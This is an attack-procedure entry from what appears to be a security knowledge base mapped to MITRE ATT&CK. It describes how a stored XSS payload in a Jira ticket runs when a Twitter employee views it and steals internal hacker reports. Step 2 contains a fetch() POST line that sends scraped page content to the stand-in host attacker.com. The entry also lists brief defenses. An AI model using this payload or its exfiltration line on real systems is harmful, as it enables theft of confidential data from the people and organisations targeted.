---
id: proc-uuid-003
tags:
  - xss
  - data-exfiltration
  - jira
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:37.875Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute-XSS-and-Exfiltrate-Sensitive-Data

## Summary

This procedure covers the execution phase where a Twitter employee views the tainted Jira ticket, triggering the stored XSS payload to run JavaScript that collects and exfiltrates sensitive data, such as internal hacker reports.

## Description

Once stored, the payload executes in the context of the viewer's browser when the Jira page loads the unsanitized content. The JavaScript can access DOM elements containing confidential information and transmit it to an external server. This targets the collection of data from internal systems. Prerequisites include the payload being stored and an employee interaction. Outcomes are the receipt of exfiltrated data, compromising internal security.

## Requirements

1. Payload successfully stored in Jira from prior steps
2. Attacker-controlled server for receiving exfiltrated data
3. Employee access to view the report (uncontrollable by attacker)

## Defense

Defensive measures and detection strategies:

- Enable XSS protection in Jira configurations (e.g., disable inline scripts)
- Monitor network traffic for unexpected outbound requests from internal tools
- Train employees on anomalous alerts or page behaviors

## Objectives

1. Trigger JavaScript execution on page load
2. Collect sensitive Jira content
3. Transmit data externally for attacker access

## Instructions

### Step 1: Monitor for Execution

**Context**: Set up a listener on the attacker's server to capture callbacks from the payload.

No command; use a simple HTTP server to log incoming requests.

> Incoming data confirms execution upon employee view.

### Step 2: Payload Actions

**Context**: The payload, once executed, scrapes and sends data like `fetch('https://attacker.com', {method: 'POST', body: JSON.stringify(document.querySelectorAll('.report-content'))})`.

No command; payload runs client-side in victim's browser.

> Exfiltrated content includes hacker reports and other Jira details.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[data-exfiltration]]
- [[Execution]]
